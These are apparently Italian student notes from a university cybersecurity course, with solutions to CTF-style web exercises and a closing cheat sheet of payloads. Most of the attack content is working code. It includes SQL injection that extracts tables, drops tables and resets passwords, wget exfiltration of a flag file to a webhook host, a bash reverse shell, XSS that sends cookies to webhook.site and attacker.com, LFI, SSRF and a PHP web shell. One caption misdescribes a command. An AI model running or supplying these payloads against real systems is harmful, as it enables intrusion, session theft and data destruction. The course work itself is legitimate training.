[Guida](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#UnionInjections)

# SQL UNION, Attacchi e Soluzioni

## UNION SQL (Esercizio)

L'uso della clausola `UNION` ci permette di estrarre dati da altre tabelle. Ad esempio, per ottenere i nomi delle tabelle in un database MySQL, possiamo usare la tabella speciale `information_schema.tables`.

**Payload:**
```sql
1' UNION SELECT NULL, table_name, NULL, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = DATABASE() -- -
```
**Risultato:**
```text
real_data, None, None, None, None
None, dummy_data, None, None, None, None
1, dummy value1, 3, another_value1, lollo, 4
```

In questo caso, scopriamo che esiste una tabella chiamata `real_data`. Successivamente, possiamo scoprire le colonne di `real_data` con il seguente payload:

```sql
1' UNION SELECT NULL, column_name, NULL, NULL, NULL, NULL FROM information_schema.columns WHERE table_name = "real_data" -- -
```
**Risultato:**
```text
None, flag, None, None, None, None
None, id, None, None, None, None
1, dummy value1, 3, another_value1, lollo, 4
```

Infine, possiamo ottenere la flag con il seguente payload:

```sql
1' UNION SELECT id, flag, null, null, null, null FROM real_data -- -
```
**Risultato:**
```text
1, flag{Uni0ns_4re_so_tr1vi4l}, None, None, None, None
1, dummy value1, 3, another_value1, lollo, 4
```

---

## Soluzione PlottyBoy (Esercizio)

1. Lanciamo un plot di una funzione.
2. Nell'header dell'output vediamo che il server è `gunicorn` e viene usata la libreria `pyGNUplot`.
3. La libreria `pyGNUplot` supporta comandi `system()`. Poiché qualsiasi cosa lanciamo causa una schermata bianca, possiamo usare un attacco blind e sfruttare un WebHook:

```python
system("wget --post-file /flag.txt https://webhook.site/304b9e35-9408-47f6-a57e-a19ca61a9a0f")
```
o
```python
system("wget https://webhook.site/304b9e35-9408-47f6-a57e-a19ca61a9a0f/$(cat /flag.txt)")
```

Altre possibilità includono l'uso di `system("whoami")` per verificare il privilegio, o una reverse shell con il comando:

```bash
system "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
```

---

## PHPISLOVE (Esercizio)

### Analisi del Codice

L'input dell'utente (`$_POST['code']`) è passato alla variabile `$code`. La blacklist contiene vari caratteri speciali, classi PHP, funzioni PHP predefinite e stringhe specifiche come `eval`, `include`, `flag`, `echo`, oltre alle variabili globali PHP come `_GET` e `_POST`.

### Parte 4: Blacklist Check

```php
foreach ($blacklist as $blacklisted) {
    if (preg_match('/' . $blacklisted . '/im', $code)) {
        $output = 'No hacks pls';
    }
}
```
Ogni elemento della blacklist viene confrontato con il codice dell'utente. Se trovato, restituisce il messaggio "No hacks pls".

### Parte 5: Codice Arbitrario

Se nessun elemento della blacklist è trovato, viene creata una funzione anonima con `create_function('', $code)`.

**Soluzione:** `};print(${$strings{4}});//`  
Questa soluzione sfrutta tre punti chiave:
1. Chiusura del contesto con `};`.
2. Accesso dinamico alla variabile con `${$strings{4}}`.
3. Stampa del contenuto con `print`.

Il `//` commenta il resto del codice per evitare errori.

---

## XSS1 (Esercizio)

L'attacco XSS sfrutta l'evento `onerror` di un'immagine per rubare i cookie di sessione dell'utente:

**Payload:**
```html
<img src="a" onerror="fetch('https://webhook.site/304b9e35-9408-47f6-a57e-a19ca61a9a0f/' + document.cookie)"></img>
```

Quando l'attributo `src="a"` causa un errore, l'evento `onerror` invia i cookie dell'utente al WebHook.

### Varianti dell'Attacco sull'URL

Se l'applicazione è vulnerabile a XSS riflesso, possiamo iniettare il payload direttamente nell'URL:

**URL vulnerabile:**
```texthttps://uniroma3.sharepoint.com/sites/AA2425-CYBERSECURITYDaDPIZZONIA2/_layouts/15/stream.aspx?id=%2Fsites%2FAA2425%2DCYBERSECURITYDaDPIZZONIA2%2FDocumenti%20condivisi%2FGeneral%2FRecordings%2FSolo%20visualizzazione%2FLezione%20Cybersecurity%20%28venerd%C3%AC%29%2D20241115%5F133335%2DMeeting%20Recording%2Emp4&referrer=StreamWebApp%2EWeb&referrerScenario=AddressBarCopied%2Eview%2Ec8e65e53%2Dbeee%2D4858%2D85c2%2D48e76af219fc
https://example.com/page?q=
```

**Payload da inserire:**
```html
?q=<script>fetch('https://webhook.site/304b9e35-9408-47f6-a57e-a19ca61a9a0f/?cookie=' + document.cookie)</script>
```

### Altre Varianti

1. Se `<script>` è bloccato, si può usare un tag HTML come `<svg>` con eventi JavaScript:
   ```html
   <svg onload="fetch('https://webhook.site/304b9e35-9408-47f6-a57e-a19ca61a9a0f/?cookie=' + document.cookie)"></svg>
   ```
2. Se JavaScript inline è bloccato, si può usare un file esterno:
   ```html
   <script src="https://attacker.com/myscript.js"></script>
   ```

---

## SSRF1 (Esercizio)

L'obiettivo è sfruttare una vulnerabilità SSRF per accedere al file `/get_flag.php` tramite il server stesso.

### Analisi del Codice PHP

Il parametro `url` viene validato con `FILTER_VALIDATE_URL`, quindi deve sembrare un URL valido con schema `http` o `https`. Dopo la validazione, il server invia una richiesta al valore dell'URL.

**Passaggi per risolvere:**
1. Prova con il parametro `url` come:
   ```text
   http://localhost/get_flag.php
   ```
   o
   ```text
   http://127.0.0.1/get_flag.php
   ```
2. Con `curl`:
   ```bash
   curl "http://target-site.com/?url=http://localhost/get_flag.php"
   ```

Se il server ha accesso al file `get_flag.php` su localhost, il contenuto verrà restituito.

---

## Basic LFI (Esercizio)

### Obiettivo

L'obiettivo è leggere il file `/etc/passwd`.

### Passaggi

1. Prova con una semplice inclusione del file:
   ```text
   http://ctfsite.com/index.php?page=../../../../etc/passwd
   ```

2. Se non funziona, prova con l'encoding:
   ```text
   http://ctfsite.com/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
   ```

**Risultato atteso:**
```text
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:User:/home/user:/bin/bash
```

---

## SHOP FLAG (Esercizio)

### Manipolazione della Richiesta POST

Puoi inviare una richiesta POST manuale a `buy.php` modificando i parametri, ad esempio il costo della bandiera:

**Esempio con curl:**
```bash
curl -X POST http://shops.challs.olicyber.it/buy.php -d "id=2&costo=10" -H "Content-Type: application/x-www-form-urlencoded"
```

Questo approccio sfrutta la fiducia del server sui dati inviati dal client.

---

## SHOP FLAG 2

### Falsificazione del Credito Residuo

Se il server controlla il credito residuo lato client (e non lato server), puoi manipolare il valore del credito nei cookie o nel local storage.

---

## SQL Injection Avanzata (Bonus)

Per indovinare il nome della colonna, puoi usare query come questa:

```sql
... AND (SELECT 1 FROM information_schema.columns WHERE table_name = 'nome_tabella' AND column_name LIKE 's%')
```

Se il nome della colonna inizia con `s`, la query restituirà un risultato.

### Alternativa con Timing Attack

Se il nome della colonna inizia con 'secret', il database può "dormire" per 5 secondi:

```sql
AND (SELECT IF(nome_colonna LIKE 'secret%', SLEEP(5), 0))
```

# ESERCIZIO SECUREflag

## Command Injection (Backtick)

Il programmatore ha dimenticato di inserire nella funzione `preg_match` il backtick (ha messo `;` ed altri). Il form prende un valore in input per il nome del file di backup del sito. Se il nome del file è protetto da tutti i caratteri speciali eccetto il backtick (\`), è possibile sfruttare i backtick per eseguire un comando arbitrario. Il backtick è un carattere utilizzato nei comandi di shell per eseguire comandi e inserire il loro output in linea. Se si riesce a iniettare un backtick, si può eseguire un comando arbitrario all'interno della shell.

### Payload per Command Injection

Per creare il file `PWND.txt` nella directory `/home/sfadmin`, si può usare un payload del genere:

```text
test\`touch /home/sfadmin/PWND.txt\`
```

### Come funziona

Il comando generato dall'applicazione (senza un'adeguata sanitizzazione):

```text
zip -r test\`touch /home/sfadmin/PWND.txt\` /path/to/backup
```

La shell eseguirà il comando `zip`, ma prima eseguirà il comando racchiuso tra i backtick: `touch /home/sfadmin/PWND.txt`. Questo crea il file `PWND.txt` nella directory `/home/sfadmin`. Risultato finale: `touch /home/sfadmin/PWND.txt` (crea il file). Il comando `zip` verrà comunque eseguito, ma non influirà sul risultato dell'exploit.

### Test del payload

1. Vai al modulo "Zip and download".
2. Inserisci come nome: `test\`touch /home/sfadmin/PWND.txt\``.
3. Clicca su "Zip and download".
4. Controlla se il file `PWND.txt` è stato creato:
    * Usa comandi come `ls /home/sfadmin` se hai accesso alla shell.
    * Oppure verifica attraverso qualsiasi altro meccanismo disponibile.

### Mitigazione del problema

Questa vulnerabilità è causata dall'assenza di una corretta sanitizzazione dell'input. Per evitare questo tipo di attacchi: Usa `escapeshellarg()` o `escapeshellcmd()` per sanitizzare l'input.

## SQL INJECTION (SECUREFLAG)

### Caso Iniziale

Il codice SQL originale era:

```sql
query = "SELECT idUser, email FROM users WHERE username='" + username + "' AND password='" + password + "'"
```

### Problemi del Caso Iniziale

* **Concatenazione Diretta di Input Utente:** I dati forniti dall'utente vengono direttamente concatenati alla query SQL senza alcun controllo o sanificazione. Questo rende il codice vulnerabile a SQL Injection.
* **Assenza di Query Parametrizzate:** Non vengono utilizzate query preparate, che proteggono automaticamente da input pericolosi. L'input dell'utente può manipolare la logica SQL.

### Attacco Sfruttato

Input: 

* **Username:** `' OR '1'='1`
* **Password:** lasciato vuoto o con un valore irrilevante. 

La query risultante era:

```sql
SELECT idUser, email FROM users WHERE username='' OR '1'='1' AND password='';
```

### Analisi dell'Attacco

* **Modifica della Logica della Query:** La parte `OR '1'='1` introduce una condizione sempre vera. Questo fa sì che la query ignori le condizioni specifiche su `username` e `password`.
* **Bypass delle Credenziali:** La query ritorna il primo record trovato nel database che soddisfa `OR '1'='1`. Non viene verificato se il campo `password` corrisponde a quello previsto.

### Altri Attacchi Simili

1. **Accesso come Primo Utente:**  
   Payload: `' OR '1'='1`.  
   Effetto: Bypassa il controllo delle credenziali e accede come primo utente del database.

2. **Scoprire se il Database è Vulnerabile:**  
   Payload: `' OR '1'='1' --`.  
   Effetto: Bypassa il controllo, sfruttando i commenti SQL (`--`) per ignorare il resto della query.

3. **Ottenere Informazioni Sensibili:**  
   Payload: `' UNION SELECT null, database(), user() --`.  
   Effetto: Ritorna il nome del database e l'utente con cui il database sta eseguendo le query.

4. **Modifica dei Dati:**  
   Payload: `' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin'; --`.  
   Effetto: Modifica i dati nel database (esempio: cambia la password di un utente).

5. **Cancellazione di Dati:**  
   Payload: `' OR 1=1; DROP TABLE users; --`.  
   Effetto: Cancella tabelle o altri dati nel database.

### Remediation (Correzione del Codice)

Usare Query Parametrizzate:

```java
String query = "SELECT idUser, email FROM users WHERE username=? AND password=?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

## Insecure File Upload (SECUREFLAG)

Il codice PHP di caricamento file presenta una vulnerabilità di sicurezza poiché:

- **Carica file senza validazione:** Il sistema non verifica né il tipo né il contenuto del file caricato. Questo consente di caricare file dannosi, come file PHP malevoli (ad esempio `.php`).
- **Esecuzione di file dannosi:** Se un file PHP viene caricato nella directory `uploads/`, potrebbe essere eseguito dal server, permettendo a un attaccante di eseguire codice arbitrario.

### Come sfruttare la vulnerabilità

1. **Creazione di un file PHP malevolo:**  
   Crea un file chiamato `shell.php` con il seguente contenuto:

   ```php
   <?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
   ```

   Questo script PHP permette di eseguire comandi di sistema tramite il parametro `cmd` nell'URL.

2. **Caricamento del file PHP:**  
   Utilizza Postman per fare il login con user e poi tramite un POST su `/users/1/picture` per caricare il file PHP come se fosse un'immagine (modificando l'estensione e il tipo del file):

   Cambia il body della richiesta per caricare `shell.php` come tipo `svg`:

   ```text
   ------WebKitFormBoundary
   Content-Disposition: form-data; name="file"; filename="shell.php"
   Content-Type: svg
   ```

   **Accesso al file caricato:** Dopo il caricamento, se il server non esegue controlli adeguati, il file PHP viene salvato nella directory `uploads/` (o una directory simile configurata sul server). È quindi possibile accedere ed eseguire il codice PHP tramite l'URL:

   ```text
   http://www.vulnerableapp.com/flagpcs/shell.php?cmd=touch /home/sfadmin/PWND.txt
   ```

   Questo comando mostra i file presenti nella directory in cui si trova `shell.php` sul server.

**Esecuzione di comandi arbitrari:** È possibile eseguire comandi arbitrari sul server passando il comando desiderato come valore del parametro `cmd` nell'URL. Ad esempio, per creare un file `PWND.txt` nella directory `/home/sfadmin`, si può utilizzare il seguente URL:

```text
http://www.vulnerableapp.com/flagpcs/shell.php?cmd=touch /home/sfadmin/PWND.txt
```

# Esercizi del Primo Esonero

## Esercizio 1: Trovare la Flag nel Sito

### Descrizione
In questo esercizio, era necessario trovare la flag all'interno di un sito web. Dopo aver analizzato gli **Elements** nella pagina, è stato individuato che una richiesta a `url/get_fplag.php` ritornava un errore "lol nope". Analizzando il codice sorgente, si è scoperto un blocco `if ($_SERVER)` che controllava l'indirizzo IP remoto, con una condizione che verificava che l'indirizzo dovesse essere `172.0.0.1`.

### Analisi e Soluzione
Il problema era che la variabile `$_SERVER['REMOTE_ADDR']` non poteva essere modificata direttamente. Tuttavia, dovevamo trovare un modo per fare una richiesta al server come se provenisse da `localhost`. In questo caso, è stato utile un file chiamato `camo.php`, che aveva la funzione di prendere un URL passato tramite GET, verificarne il formato (controllando che non contenesse `127` o `localhost`), e fare una richiesta GET a quell'URL.

Una delle soluzioni è stata passare un URL che puntasse a un dominio che sembrasse `localhost`, come ad esempio `localhost.me`.

#### Soluzione
Il link funzionante era:

```text
url/camo.php?url=http%3A%2F%2Flocaltest.me/get_flag.php
```

In alternativa, si poteva usare anche `0.0.0.0` al posto di `localtest.me`, quindi un altro esempio valido sarebbe:

```text
url/camo.php?url=http%3A%2F%2F0.0.0.0/get_flag.php
```

Questa soluzione ha permesso di aggirare il controllo sull'indirizzo IP e ottenere la flag.

---

## Esercizio 2: SQL Injection (BASICSqli)

### Descrizione
L'esercizio consisteva nell'effettuare un login senza avere le credenziali. Un approccio classico per bypassare la schermata di login è utilizzare una SQL Injection, ad esempio:

```text
' OR 1=1 --
```

Tuttavia, in questo caso, per ottenere un risultato positivo, era necessario aggiungere uno spazio dopo l'`OR 1=1` all'interno del commento, in modo da aggirare la protezione e ottenere l'accesso.

### Analisi e Soluzione
Quando si usava il classico payload con `' OR 1=1 --`, la pagina restituiva una seconda schermata che rivelava la struttura del database. In alternativa, sarebbe stato necessario interrogare la tabella `information_schema` per ottenere informazioni sulle tabelle e colonne del database.

#### Soluzioni per ottenere la Flag

Esistono due possibili soluzioni:

1. **Blind SQL Injection**: Consiste nell'inviare varie richieste per cercare di ottenere la flag, provando diverse condizioni che potrebbero rivelare il contenuto della base dati, ma questa tecnica è più lenta e complessa.

2. **Union Query SQL Injection**: Una soluzione più semplice ed efficace è stata quella di utilizzare una **UNION** per combinare la query di login con altre query, come ad esempio:

```text
' UNION SELECT 1,2,3 --
```

Questa query è stata utilizzata per ottenere informazioni sul database. Successivamente, si è aggiunto il numero di colonne corrispondente alla struttura della tabella di login (in questo caso 3), per ottenere i risultati desiderati.

#### Passaggi per la Soluzione con UNION

1. Inizialmente, si esegue il login con la SQL Injection per bypassare l'autenticazione.
2. Si aggiunge una **UNION** per restituire dati dal database:
   
   ```text
   ' UNION SELECT null, database(), user() --
   ```

   Questo esempio restituirà il nome del database e l'utente del database.

3. Dopo aver ottenuto la struttura del database, è possibile procedere a estrarre altre informazioni, come le tabelle e le colonne necessarie per localizzare la flag.

### Conclusioni
Utilizzare una **UNION SQL Injection** è stato il metodo più semplice ed efficace per risolvere l'esercizio, evitando il lungo processo di tentativi con **Blind SQL Injection**.
---

## 1. **SQL Injection con UNION**  

**Contesto:**  
Devi ottenere dati da altre tabelle del database sfruttando vulnerabilità nella query SQL (ad esempio il login).  

**Comandi da usare:**  

- Per ottenere i nomi delle tabelle:  
```sql
1' UNION SELECT NULL, table_name, NULL, NULL FROM information_schema.tables WHERE table_schema = DATABASE() --
```

- Per ottenere i nomi delle colonne di una tabella specifica:
```sql
1' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name = "nome_tabella" --
```

- Per estrarre valori:
```sql
1' UNION SELECT colonna1, colonna2 FROM nome_tabella --
```

## 2. **Command Injection**

**Contesto:**
Hai la possibilità di iniettare comandi di sistema (es. tramite backtick o altre vulnerabilità).

**Comandi da usare:**

- Esegui un comando arbitrario (creazione di file):
```bash
test`touch /home/sfadmin/PWND.txt`
```

- Reverse shell:
```bash
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
```

- Invia file o output a un server remoto:
```bash
system("wget --post-file /flag.txt https://webhook.site/abc123")
```

## 3. **XSS (Cross-Site Scripting)**

**Contesto:**
Devi rubare cookie o eseguire script lato client tramite iniezioni di codice.

**Comandi da usare:**

- Cookie Stealing:
```html
<img src="a" onerror="fetch('https://webhook.site/abc123/' + document.cookie)">
```

- Iniezione in URL (XSS riflesso):
```html
?q=<script>fetch('https://webhook.site/abc123/?cookie=' + document.cookie)</script>
```

- Alternative senza `<script>`:
```html
<svg onload="fetch('https://webhook.site/abc123/?cookie=' + document.cookie)"></svg>
```

## 4. **SSRF (Server-Side Request Forgery)**

**Contesto:**
Devi sfruttare il server per accedere a risorse interne, come file o servizi protetti (es. localhost).

**Comandi da usare:**

- Per accedere a file interni:
```bash
curl "http://target-site.com/?url=http://localhost/get_flag.php"
```

- Prova con altre varianti di URL locali:
```bash
http://127.0.0.1/get_flag.php  
http://[::1]/get_flag.php
```

## 5. **LFI (Local File Inclusion)**

**Contesto:**
Devi leggere file del server includendo percorsi locali.

**Comandi da usare:**

- Lettura diretta:
```bash
http://ctfsite.com/index.php?page=../../../../etc/passwd
```

- Se l'encoding è richiesto:
```bash
http://ctfsite.com/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

## 6. **Manipolazione di Parametri (SHOP FLAG)**

**Contesto:**
Devi modificare i parametri inviati al server per acquistare o ottenere oggetti senza rispettare le regole.

**Comandi da usare:**

- Richiesta POST manuale:
```bash
curl -X POST http://shops.challs.olicyber.it/buy.php -d "id=2&costo=10" -H "Content-Type: application/x-www-form-urlencoded"
```

## 7. **File Upload Insecure**

**Contesto:**
Devi caricare un file per eseguire comandi arbitrari sul server.

**Comandi da usare:**

- File PHP malevolo (per eseguire comandi):
```php
<?php if (isset($_GET['cmd'])) { system($_GET['cmd']); } ?>
```

- Upload del file tramite richiesta:
```bash
curl -X POST -F "file=@shell.php" http://target-site.com/upload
```

- Esegui il file caricato:
```bash
http://target-site.com/uploads/shell.php?cmd=ls
```

## 8. **Esercizio Secureflag - SQL Injection Base**

**Contesto:**
Devi bypassare il login o manipolare query SQL.

**Comandi da usare:**

- Per bypassare login:
```sql
' OR 1=1 --
```

- Per scoprire database e utente corrente:
```sql
' UNION SELECT null, database(), user() --
```

## 9. **Command Injection Specifico (Backtick)**

**Contesto:**
Devi sfruttare l'assenza di sanitizzazione sui backtick per eseguire comandi di sistema.

**Comandi da usare:**

- Payload per creare file:
```bash
test`touch /home/sfadmin/PWND.txt`
```

## 10. **Esercizio XSS - Iniezioni Specifiche**

**Contesto:**
Devi sfruttare vulnerabilità XSS riflesso o persistente.

**Comandi da usare:**

- Iniezione HTML per rubare cookie:
```html
<img src="a" onerror="fetch('https://webhook.site/abc123/' + document.cookie)">
```